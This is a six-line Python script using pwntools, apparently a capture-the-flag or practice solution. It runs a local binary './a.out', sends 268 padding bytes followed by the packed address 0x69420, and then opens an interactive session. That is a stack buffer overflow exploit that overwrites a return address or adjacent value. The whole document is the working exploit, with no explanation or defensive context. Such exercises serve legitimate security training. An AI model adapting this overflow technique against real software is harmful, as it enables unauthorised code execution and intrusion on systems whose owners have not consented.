from pwn import *
r1=process("./a.out")
r2 = b'a'*268+p32(0x69420)
r1.sendline(r2)
r1.interactive()
r1.close()
